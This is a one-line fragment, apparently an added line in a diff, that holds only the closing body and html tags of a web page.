+</body></html>
